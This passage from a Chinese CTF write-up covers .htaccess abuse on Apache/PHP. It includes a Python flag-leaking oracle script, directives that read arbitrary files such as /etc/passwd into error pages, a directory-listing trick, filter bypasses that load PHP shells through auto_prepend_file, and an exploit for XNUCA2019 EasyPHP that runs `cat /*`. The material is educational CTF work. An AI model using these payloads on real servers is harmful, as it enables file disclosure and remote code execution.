```python
import requests
import sys

url = "http://challenge.imxbt.cn:31384/"

flag = "PCTF{"


def check(curr_flag):

    hta_data = f"""<If "file(\'/love1145141919810\') < '{curr_flag}'">
ErrorDocument 404 "success"
</If>"""

    hta_data_escaped = hta_data.replace('"', '\\"')

    payload = f"file_put_contents('.htaccess', \"{hta_data_escaped}\");"


    try:
        requests.post(url, data={"Wl&come_to!Pctf_2025?": payload})
        res = requests.get(f"{url}Pr0")
        if "success" in res.text:
            return True
        else:
            return False
    except:
        return False


while True:
    high = 126
    low = 32

    while low <= high:
        mid = (low + high) // 2
        char = chr(mid)

        tmp = flag + char

        if check(tmp):
            high = mid - 1
        else:
            low = mid + 1

    found_char = chr(high)
    flag += found_char
    print(flag)

    if found_char.endswith("}"):
        break
```

![image-20251225202324916](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225202325420.png)

**直接读文件**

```htaccess
ErrorDocument 404 "%{file:/love1145141919810}"
```

![image-20251225202639950](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225202640277.png)

![image-20251225202702795](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225202703017.png)

**利用环境变量**

```htaccess
SetEnvIfExpr "file('/etc/passwd') =~ /(.*)/" TMP=$1
ErrorDocument 404 "%{ENV:TMP}"
```

![image-20251226095613002](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251226095613369.png)

### 列目录

在容器内部指令中有`Options`以及`DirectoryIndex`这两个选项

`Options`可以设置是否开启目录浏览

`DirectoryIndex`

apache中，当客户端请求一个以`/`结尾的目录的时候apache会按照`DirectoryIndex`后面列出的文件名顺序，去目录下查找是否存在这些文件

**如果找到：**

- 列出的文件则直接显示(如果是脚本则执行)

**如果列表中的文件都不存在：**

- 如果开启了 `Options Indexes`，则会显示该目录下的文件列表

- 如果没开启 `Indexes`，则报403错误

因此我们将目录浏览开启之后将`DirectoryIndex`设置成一个不存在的文件，就能够让服务器列出当前目录下的文件，这里`DirectoryIndex`中的根目录指的是网站根目录，也就是如果设置

```htaccess
DirectoryIndex /flag
```

会在/var/www/html中寻找flag文件，所以没法列出根目录的文件，除非配置文件把根目录设置成Require all granted

**利用方式**：

```htaccess
Options +Indexes
DirectoryIndex Nothing
```

![image-20251225213317107](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225213317641.png)

![image-20251225213337155](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225213337376.png)

但是只能读取当前目录，如果能创建一个连接到根目录的软连接就能读取到根目录了，但是open_basedir的限制下没法在php中直接创建，还是拿自己创建的有open_basedir的环境演示

因为有open_basedir没法直接创建指向根目录的软连接，先用CGI创建一个，不过既然都能创建根目录的软连接用这个方法就有点多余了，这里仅做示范

![image-20251226100829098](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251226100829437.png)

然后列目录

![image-20251226100914439](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251226100914784.png)

![image-20251226100938584](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251226100938807.png)



![image-20251226100945690](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251226100945828.png)

### 脏字符绕过

htaccess的语法支持用`\`来进行换行而不中断语句，`#`对当前行进行注释

**利用方式**：

- **反斜杠换行**：

  ```htaccess
  ph\
  p_value auto_prepend_file shell.php
  ```
  
- **脏字符注释**：利用 `#\` 注释掉文件末尾的垃圾数据。

  ```htaccess
  php_value auto_prepend_file shell.jpg
  #\
  (乱码...)
  ```

示例:

**[XNUCA2019Qualifier]EasyPHP**

源码:

```php
<?php
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    include_once("fl3g.php");
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) == 1) {
        echo "Hacker";
        die();
    }
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nJust one chance");
?>
```

在创建文件之后会在文件末尾换行后添加`Just one chance`，如果直接写入htaccess的payload的话会因为格式错误导致靶机死掉，所有页面都是500报错，此时需要在末尾加上`#\`通过换行注释的形式将末尾的多余字符注释掉

```python
import requests

url = "http://b93a6b86-e111-436c-ada8-48fb13baadfa.node5.buuoj.cn:81/"

content = """php_value auto_append_fi\\
le .htaccess
#<?php echo `cat /*`;?>
#\\"""

params = { "filename" : ".htaccess", "content" : content }

res = requests.get(url, params=params)

print(res.text)
```

![image-20251226140324025](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251226140324575.png)

-----

参考:

https://www.php.net/manual/zh/ini.list.php

https://httpd.apache.org/docs/2.4/expr.html



https://www.cnblogs.com/LAMENTXU/articles/19383927

https://eastjun.top/posts/htaccess_use/

